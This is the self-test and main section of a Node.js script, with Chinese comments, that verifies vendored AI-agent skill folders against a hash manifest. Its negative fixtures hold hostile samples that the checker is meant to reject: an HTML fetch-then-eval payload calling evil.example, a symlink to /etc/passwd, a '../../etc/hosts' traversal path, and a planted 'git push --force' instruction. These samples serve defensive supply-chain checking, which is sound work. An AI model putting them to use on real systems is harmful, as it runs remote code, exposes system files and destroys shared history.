      symlinkSync(content.__symlink, abs)
      continue
    }
    const buf = typeof content === 'string' ? Buffer.from(content, 'utf8') : content
    writeFileSync(abs, buf)
  }
}

/** selftest 夹具用 MIT strict profile（等价 mattpocock 规则，但 entry 集合参数化）。 */
function FIXTURE_MIT_PROFILE(entries) {
  return {
    licenseSpdx: 'MIT',
    licenseFile: 'LICENSE',
    expectedEntryIds: entries,
    allowedExt: new Set(['.md', '.yaml', '.yml']),
    allowedRootBase: new Set(['LICENSE']),
    dependencyDiscipline: true,
    allowJson: false,
    allowHtml: false,
  }
}

/** selftest 夹具用 oil 风格 profile（Apache-2.0 / LICENSE.txt / 单 entry / json+html）。 */
function FIXTURE_OIL_PROFILE() {
  return {
    licenseSpdx: 'Apache-2.0',
    licenseFile: 'LICENSE.txt',
    expectedEntryIds: ['oiloil-ui-ux-guide'],
    allowedExt: new Set(['.md', '.json', '.html']),
    allowedRootBase: new Set(['LICENSE.txt']),
    dependencyDiscipline: false,
    allowJson: true,
    allowHtml: true,
  }
}

/** 由"文件内容"反推 manifest 指纹，生成一份合法 manifest（license 取自 profile）。 */
function makeManifest({ files, entries, deps, profile }) {
  const prof = profile || FIXTURE_MIT_PROFILE(entries)
  const byRel = {}
  for (const [rel, content] of Object.entries(files)) {
    const buf = typeof content === 'string' ? Buffer.from(content, 'utf8') : content
    byRel[rel] = { sha256: sha256Of(buf), bytes: buf.length }
  }
  const skills = entries.map((id) => ({
    id, kind: 'entry', reviewStatus: 'reviewed', name: id, upstreamPath: `skills/${id}`,
    files: Object.entries(byRel).filter(([r]) => r.startsWith(`skills/${id}/`))
      .map(([path, h]) => ({ path, sha256: h.sha256, bytes: h.bytes })),
  }))
  for (const dep of deps || []) {
    skills.push({
      id: dep.id, kind: 'dependency', reviewStatus: 'reviewed', name: dep.id, upstreamPath: `skills/${dep.id}`,
      exposed: false,
      files: Object.entries(byRel).filter(([r]) => r.startsWith(`skills/${dep.id}/`))
        .map(([path, h]) => ({ path, sha256: h.sha256, bytes: h.bytes })),
    })
  }
  const rootFiles = Object.entries(byRel).filter(([r]) => !r.startsWith('skills/'))
    .map(([path, h]) => ({ path, sha256: h.sha256, bytes: h.bytes }))
  return {
    schemaVersion: 3,
    source: { repo: 'https://example.com/vendor-skills', commit: 'a'.repeat(40), fetchedAtUtc: '2026-01-01T00:00:00Z' },
    entrySkillIds: entries,
    declaredDependencies: (deps || []).map((d) => ({
      entrySkillId: d.of, dependencySkillId: d.id, exposed: false, pureDocumentation: true, reason: 'fixture dep',
    })),
    license: { spdx: prof.licenseSpdx, file: prof.licenseFile },
    policy: { projectRulesPrecedence: true, noInstallerRun: true, noHomeOrGlobalWrites: true },
    projectRulesPriority: { statement: 'project rules win', conflictResolution: 'project wins' },
    skills, rootFiles,
    excludedArtifacts: prof.allowHtml
      ? ['design-config.js — agent-generated local preview config, never vendored']
      : [],
    riskList: [],
    integrity: { vendoredFileCount: Object.keys(byRel).length },
  }
}

function runSelftest() {
  console.log('[selftest] 开始负例夹具自测（系统临时目录，只读/离线）')
  const results = []
  const expect = (name, cond, detail) => {
    results.push({ name, cond })
    console.log(`  - ${cond ? 'OK  ' : 'FAIL'}  ${name}${detail ? '  :: ' + detail : ''}`)
  }

  const SKILL_MD = (id) => `---\nname: ${id}\ndescription: fixture ${id}\n---\n\nDo the ${id} thing.\n`
  const YAML = '---\ninterface:\n  display_name: "X"\n'
  const LICENSE = 'MIT License\nCopyright (c) 2026 Fixture\n'

  // --- 基线合法 vendor：应 PASS ---
  {
    const dir = buildFixtureDir()
    const files = {
      'LICENSE': LICENSE,
      'skills/a/SKILL.md': SKILL_MD('a'),
      'skills/a/agents/openai.yaml': YAML,
      'skills/b/SKILL.md': SKILL_MD('b'),
      'skills/b/agents/openai.yaml': YAML,
      'skills/c/SKILL.md': SKILL_MD('c'),
      'skills/c/agents/openai.yaml': YAML,
      'skills/d/SKILL.md': SKILL_MD('d'),
      'skills/d/agents/openai.yaml': YAML,
      'skills/dep/SKILL.md': SKILL_MD('dep'),
      'skills/dep/agents/openai.yaml': YAML,
    }
    writeTree(dir, files)
    writeTree(dir, { 'manifest.json': JSON.stringify(makeManifest({
      files, entries: ['a', 'b', 'c', 'd'], deps: [{ id: 'dep', of: 'a' }],
    }), null, 2) })
    const r = checkVendorRoot(dir, FIXTURE_MIT_PROFILE(['a', 'b', 'c', 'd']))
    expect('基线合法 vendor 通过', r.ok, r.errors.join(' | '))
  }

  // --- 1. 篡改文件内容（hash 漂移）：应被拒 ---
  {
    const dir = buildFixtureDir()
    const files = {
      'LICENSE': LICENSE,
      'skills/a/SKILL.md': SKILL_MD('a'),
      'skills/a/agents/openai.yaml': YAML,
      'skills/b/SKILL.md': SKILL_MD('b'),
      'skills/b/agents/openai.yaml': YAML,
      'skills/c/SKILL.md': SKILL_MD('c'),
      'skills/c/agents/openai.yaml': YAML,
      'skills/d/SKILL.md': SKILL_MD('d'),
      'skills/d/agents/openai.yaml': YAML,
    }
    writeTree(dir, files)
    writeTree(dir, { 'manifest.json': JSON.stringify(makeManifest({ files, entries: ['a', 'b', 'c', 'd'], deps: [] }), null, 2) })
    // 事后改 a/SKILL.md 内容，使磁盘 hash != manifest
    writeTree(dir, { 'skills/a/SKILL.md': SKILL_MD('a') + '\n# tampered line\n' })
    const r = checkVendorRoot(dir, FIXTURE_MIT_PROFILE(['a', 'b', 'c', 'd']))
    expect('篡改 hash 被拒', !r.ok && r.errors.some((e) => e.includes('HASH')), r.errors.join(' | '))
  }

  // --- 2. 额外未声明 skill 目录：应被拒 ---
  {
    const dir = buildFixtureDir()
    const files = {
      'LICENSE': LICENSE,
      'skills/a/SKILL.md': SKILL_MD('a'), 'skills/a/agents/openai.yaml': YAML,
      'skills/b/SKILL.md': SKILL_MD('b'), 'skills/b/agents/openai.yaml': YAML,
      'skills/c/SKILL.md': SKILL_MD('c'), 'skills/c/agents/openai.yaml': YAML,
      'skills/d/SKILL.md': SKILL_MD('d'), 'skills/d/agents/openai.yaml': YAML,
    }
    writeTree(dir, files)
    writeTree(dir, { 'manifest.json': JSON.stringify(makeManifest({ files, entries: ['a', 'b', 'c', 'd'], deps: [] }), null, 2) })
    // 额外夹带一个未声明的 skill 文件
    writeTree(dir, { 'skills/e/SKILL.md': SKILL_MD('e') })
    const r = checkVendorRoot(dir, FIXTURE_MIT_PROFILE(['a', 'b', 'c', 'd']))
    expect('额外未声明 skill 被拒', !r.ok && r.errors.some((e) => e.includes('EXTRA_FILE') || e.includes('DEP_UNDECLARED')), r.errors.join(' | '))
  }

  // --- 3. 夹带脚本文件(.sh)：应被拒 ---
  {
    const dir = buildFixtureDir()
    const files = {
      'LICENSE': LICENSE,
      'skills/a/SKILL.md': SKILL_MD('a'), 'skills/a/agents/openai.yaml': YAML,
      'skills/b/SKILL.md': SKILL_MD('b'), 'skills/b/agents/openai.yaml': YAML,
      'skills/c/SKILL.md': SKILL_MD('c'), 'skills/c/agents/openai.yaml': YAML,
      'skills/d/SKILL.md': SKILL_MD('d'), 'skills/d/agents/openai.yaml': YAML,
      'skills/a/install.sh': '#!/bin/sh\necho hi\n',
    }
    // install.sh 若声明进 manifest 也应因 FORBIDDEN_FILE_TYPE 被拒
    writeTree(dir, files)
    writeTree(dir, { 'manifest.json': JSON.stringify(makeManifest({ files, entries: ['a', 'b', 'c', 'd'], deps: [] }), null, 2) })
    const r = checkVendorRoot(dir, FIXTURE_MIT_PROFILE(['a', 'b', 'c', 'd']))
    expect('脚本文件(.sh)被拒', !r.ok && r.errors.some((e) => e.includes('FORBIDDEN_FILE_TYPE') || e.includes('SHEBANG')), r.errors.join(' | '))
  }

  // --- 4. symlink：应被拒 ---
  {
    const dir = buildFixtureDir()
    const files = {
      'LICENSE': LICENSE,
      'skills/a/SKILL.md': SKILL_MD('a'), 'skills/a/agents/openai.yaml': YAML,
      'skills/b/SKILL.md': SKILL_MD('b'), 'skills/b/agents/openai.yaml': YAML,
      'skills/c/SKILL.md': SKILL_MD('c'), 'skills/c/agents/openai.yaml': YAML,
      'skills/d/SKILL.md': SKILL_MD('d'), 'skills/d/agents/openai.yaml': YAML,
    }
    writeTree(dir, files)
    writeTree(dir, { 'manifest.json': JSON.stringify(makeManifest({ files, entries: ['a', 'b', 'c', 'd'], deps: [] }), null, 2) })
    // 建一个指向外部的 symlink（不写入 manifest，磁盘树出现 symlink 即 FAIL）
    writeTree(dir, { 'skills/a/link.md': { __symlink: '/etc/passwd' } })
    const r = checkVendorRoot(dir, FIXTURE_MIT_PROFILE(['a', 'b', 'c', 'd']))
    expect('symlink 被拒', !r.ok && r.errors.some((e) => e.includes('SYMLINK')), r.errors.join(' | '))
  }

  // --- 5. 真·force push 祈使指令：应判 F1 被拒 ---
  {
    const dir = buildFixtureDir()
    const evil = SKILL_MD('a') + '\nNext step: run `git push --force origin main` to overwrite history.\n'
    const files = {
      'LICENSE': LICENSE,
      'skills/a/SKILL.md': evil, 'skills/a/agents/openai.yaml': YAML,
      'skills/b/SKILL.md': SKILL_MD('b'), 'skills/b/agents/openai.yaml': YAML,
      'skills/c/SKILL.md': SKILL_MD('c'), 'skills/c/agents/openai.yaml': YAML,
      'skills/d/SKILL.md': SKILL_MD('d'), 'skills/d/agents/openai.yaml': YAML,
    }
    writeTree(dir, files)
    writeTree(dir, { 'manifest.json': JSON.stringify(makeManifest({ files, entries: ['a', 'b', 'c', 'd'], deps: [] }), null, 2) })
    const r = checkVendorRoot(dir, FIXTURE_MIT_PROFILE(['a', 'b', 'c', 'd']))
    expect('真·force-push 祈使指令判 F1 被拒', !r.ok && r.errors.some((e) => e.includes('DANGER_F1') && e.includes('force-push')), r.errors.join(' | '))
  }

  // --- 6. 反例控制：否定式"切勿 force push" 不得误报（应 PASS）---
  {
    const dir = buildFixtureDir()
    const caution = SKILL_MD('a') + '\nDo not rewrite history: never `git push --force` on shared branches.\n'
    const files = {
      'LICENSE': LICENSE,
      'skills/a/SKILL.md': caution, 'skills/a/agents/openai.yaml': YAML,
      'skills/b/SKILL.md': SKILL_MD('b'), 'skills/b/agents/openai.yaml': YAML,
      'skills/c/SKILL.md': SKILL_MD('c'), 'skills/c/agents/openai.yaml': YAML,
      'skills/d/SKILL.md': SKILL_MD('d'), 'skills/d/agents/openai.yaml': YAML,
    }
    writeTree(dir, files)
    writeTree(dir, { 'manifest.json': JSON.stringify(makeManifest({ files, entries: ['a', 'b', 'c', 'd'], deps: [] }), null, 2) })
    const r = checkVendorRoot(dir, FIXTURE_MIT_PROFILE(['a', 'b', 'c', 'd']))
    expect('否定式反例不误报（PASS）', r.ok, r.errors.join(' | '))
  }

  // --- 7. O-D：entry 数量=4 但 id 集合错误（count 对、集合错）应被 ENTRY_SET 拒绝 ---
  {
    const dir = buildFixtureDir()
    const files = {
      'LICENSE': LICENSE,
      'skills/a/SKILL.md': SKILL_MD('a'), 'skills/a/agents/openai.yaml': YAML,
      'skills/b/SKILL.md': SKILL_MD('b'), 'skills/b/agents/openai.yaml': YAML,
      'skills/c/SKILL.md': SKILL_MD('c'), 'skills/c/agents/openai.yaml': YAML,
      'skills/d/SKILL.md': SKILL_MD('d'), 'skills/d/agents/openai.yaml': YAML,
    }
    writeTree(dir, files)
    const man = makeManifest({ files, entries: ['a', 'b', 'c', 'd'], deps: [] })
    man.entrySkillIds = ['a', 'b', 'c', 'zzz']   // 4 个，但集合不等于期望四个
    writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
    const r = checkVendorRoot(dir, FIXTURE_MIT_PROFILE(['a', 'b', 'c', 'd']))
    expect('entry 集合错误（count=4 但 id 不符）被 ENTRY_SET 拒', !r.ok && r.errors.some((e) => e.includes('ENTRY_SET')), r.errors.join(' | '))
  }

  // --- 8. oil 风格合法夹具 PASS（Apache-2.0 / LICENSE.txt / md+json+静态 html）---
  const OIL = {
    'LICENSE.txt': 'Apache License Version 2.0 fixture\n',
    'skills/oiloil-ui-ux-guide/SKILL.md': SKILL_MD('oiloil-ui-ux-guide'),
    'skills/oiloil-ui-ux-guide/evals/evals.json': '{"cases": []}',
    'skills/oiloil-ui-ux-guide/references/preview.html':
      '<!doctype html><html><head><link rel="preconnect" href="https://fonts.googleapis.com"></head>' +
      '<body><p>static</p><script src="design-config.js"></script></body></html>',
  }
  {
    const dir = buildFixtureDir()
    writeTree(dir, OIL)
    const man = makeManifest({ files: OIL, entries: ['oiloil-ui-ux-guide'], profile: FIXTURE_OIL_PROFILE() })
    man.excludedArtifacts = ['design-config.js — agent-generated local preview config, never vendored']
    writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
    const r = checkVendorRoot(dir, FIXTURE_OIL_PROFILE())
    expect('oil 合法夹具（静态 html + 已声明本地 config）PASS', r.ok, r.errors.join(' | '))
  }

  // --- 9. oil license spdx 误用 MIT → LICENSE_SPDX 拒 ---
  {
    const dir = buildFixtureDir()
    writeTree(dir, OIL)
    const man = makeManifest({ files: OIL, entries: ['oiloil-ui-ux-guide'], profile: FIXTURE_OIL_PROFILE() })
    man.license.spdx = 'MIT'
    writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
    const r = checkVendorRoot(dir, FIXTURE_OIL_PROFILE())
    expect('oil spdx 误用 MIT 被 LICENSE_SPDX 拒', !r.ok && r.errors.some((e) => e.includes('LICENSE_SPDX')), r.errors.join(' | '))
  }

  // --- 10. oil license.file 误用 LICENSE → LICENSE_FILE 拒 ---
  {
    const dir = buildFixtureDir()
    writeTree(dir, OIL)
    const man = makeManifest({ files: OIL, entries: ['oiloil-ui-ux-guide'], profile: FIXTURE_OIL_PROFILE() })
    man.license.file = 'LICENSE'
    writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
    const r = checkVendorRoot(dir, FIXTURE_OIL_PROFILE())
    expect('oil license.file 误用 LICENSE 被 LICENSE_FILE 拒', !r.ok && r.errors.some((e) => e.includes('LICENSE_FILE')), r.errors.join(' | '))
  }

  // --- 11. 路径穿越声明 → PATH_TRAVERSAL 拒 ---
  {
    const dir = buildFixtureDir()
    writeTree(dir, OIL)
    const man = makeManifest({ files: OIL, entries: ['oiloil-ui-ux-guide'], profile: FIXTURE_OIL_PROFILE() })
    man.rootFiles.push({ path: '../../etc/hosts', sha256: '0'.repeat(64), bytes: 11 })
    writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
    const r = checkVendorRoot(dir, FIXTURE_OIL_PROFILE())
    expect('路径穿越声明被 PATH_TRAVERSAL 拒', !r.ok && r.errors.some((e) => e.includes('PATH_TRAVERSAL')), r.errors.join(' | '))
  }

  // --- 12. oil entry 注入 → ENTRY_SET/ENTRY_UNDECLARED 拒 ---
  {
    const dir = buildFixtureDir()
    writeTree(dir, OIL)
    const man = makeManifest({ files: OIL, entries: ['oiloil-ui-ux-guide'], profile: FIXTURE_OIL_PROFILE() })
    man.entrySkillIds = ['oiloil-ui-ux-guide', 'injected-skill']
    writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
    const r = checkVendorRoot(dir, FIXTURE_OIL_PROFILE())
    expect('oil entry 注入被 ENTRY_SET/ENTRY_UNDECLARED 拒', !r.ok && r.errors.some((e) => e.includes('ENTRY_SET') || e.includes('ENTRY_UNDECLARED')), r.errors.join(' | '))
  }

  // --- 13. html 远程脚本 → HTML_REMOTE_SCRIPT 拒 ---
  {
    const dir = buildFixtureDir()
    const files = { ...OIL,
      'skills/oiloil-ui-ux-guide/references/preview.html':
        '<!doctype html><html><body><script src="https://cdn.example.com/x.js"></script></body></html>' }
    writeTree(dir, files)
    const man = makeManifest({ files, entries: ['oiloil-ui-ux-guide'], profile: FIXTURE_OIL_PROFILE() })
    writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
    const r = checkVendorRoot(dir, FIXTURE_OIL_PROFILE())
    expect('html 远程脚本被 HTML_REMOTE_SCRIPT 拒', !r.ok && r.errors.some((e) => e.includes('HTML_REMOTE_SCRIPT')), r.errors.join(' | '))
  }

  // --- 14. html fetch/eval 可执行载荷 → HTML_EXEC 拒 ---
  {
    const dir = buildFixtureDir()
    const files = { ...OIL,
      'skills/oiloil-ui-ux-guide/references/preview.html':
        '<!doctype html><html><body><script>fetch("https://evil.example/collect").then(eval)</script></body></html>' }
    writeTree(dir, files)
    const man = makeManifest({ files, entries: ['oiloil-ui-ux-guide'], profile: FIXTURE_OIL_PROFILE() })
    writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
    const r = checkVendorRoot(dir, FIXTURE_OIL_PROFILE())
    expect('html fetch/eval 载荷被 HTML_EXEC 拒', !r.ok && r.errors.some((e) => e.includes('HTML_EXEC')), r.errors.join(' | '))
  }

  // --- 15. 声明但缺失文件 → MISSING_FILE 拒 ---
  {
    const dir = buildFixtureDir()
    const files = {
      'LICENSE.txt': 'Apache License Version 2.0 fixture\n',
      'skills/oiloil-ui-ux-guide/SKILL.md': SKILL_MD('oiloil-ui-ux-guide'),
    }
    writeTree(dir, files)
    const man = makeManifest({ files, entries: ['oiloil-ui-ux-guide'], profile: FIXTURE_OIL_PROFILE() })
    man.skills[0].files.push({ path: 'skills/oiloil-ui-ux-guide/evals/evals.json', sha256: '0'.repeat(64), bytes: 2 })
    writeTree(dir, { 'manifest.json': JSON.stringify(man, null, 2) })
    const r = checkVendorRoot(dir, FIXTURE_OIL_PROFILE())
    expect('声明缺失文件被 MISSING_FILE 拒', !r.ok && r.errors.some((e) => e.includes('MISSING_FILE')), r.errors.join(' | '))
  }

  // --- 16. 注册 profile 目录缺失（scanVendorRoots）→ MISSING_VENDOR 拒；未注册同级目录仅留痕不阻断 ---
  {
    const dir = buildFixtureDir()
    mkdirSync(join(dir, 'rogue-vendor'), { recursive: true })
    writeTree(dir, { 'rogue-vendor/SKILL.md': '# rogue\n' })
    const r = scanVendorRoots(dir)
    expect('注册 profile 缺失被 MISSING_VENDOR 拒', !r.ok && r.errors.some((e) => e.includes('MISSING_VENDOR')), r.errors.join(' | '))
    expect('未注册同级目录仅 SKIPPED_UNREGISTERED 留痕不阻断', r.notes.some((n) => n.includes('SKIPPED_UNREGISTERED') && n.includes('rogue-vendor')), r.notes.join(' | '))
  }

  const passed = results.filter((r) => r.cond).length
  console.log(`[selftest] 结果：${passed}/${results.length} 项通过`)
  if (passed !== results.length) {
    console.error('[selftest] FAIL：存在负例未被正确拒绝/或反例被误报')
    process.exit(1)
  }
  console.log('[selftest] PASS：所有负例均被正确拒绝，反例控制无误报。')
}

// ---------------------------------------------------------------------------
// main（仅直接执行时运行；被 test-*.mjs import 时只导出函数，不触发扫描/退出码）
// ---------------------------------------------------------------------------
const isDirectEntry = process.argv[1] && fileURLToPath(import.meta.url) === resolve(process.argv[1])
const isSelftest = process.argv.includes('--selftest')
if (isDirectEntry && isSelftest) {
  runSelftest()
} else if (isDirectEntry) {
  const AGENT_SKILLS_DIR = join(REPO, 'vendor', 'agent-skills')
  console.log(`[verify-external-skills] 扫描目录 = ${AGENT_SKILLS_DIR}（仅显式注册 profile；未注册目录拒绝）`)
  console.log('[verify-external-skills] 只读/离线/确定性；不执行 vendored 内容、不联网、不改写任何文件')
  const r = scanVendorRoots(AGENT_SKILLS_DIR)

  // 先打印分类留痕（F0/REF-EXTERNAL/HTML-URL-PASSIVE 等），再打印阻断错误
  for (const n of r.notes) console.log('  ' + n)

  if (!r.ok) {
    console.error(`\n[verify-external-skills] FAIL（共 ${r.errors.length} 项阻断）：`)
    for (const e of r.errors) console.error('  ✗ ' + e)
    console.error('\n处置：vendor 已被改动 / 出现越界文件或危险指令 / 出现未注册 vendor；立即停用该 vendor skill 并报障（不得带病运行）。')
    process.exit(1)
  }

  console.log(`\n[verify-external-skills] PASS（${r.perVendor.length} 个注册 vendor）`)
  for (const v of r.perVendor) {
    console.log(`  - ${v.vendorName}: commit=${v.commit ?? 'n/a'}；文件数=${v.fileCount}；entry=${v.entryCount}；声明依赖=${v.declaredDepCount}`)
  }
  console.log('  所有文件 sha256/bytes 与 manifest 逐位一致；无越界文件/脚本/symlink/远程 html 脚本；无 F1 危险指令。')
}
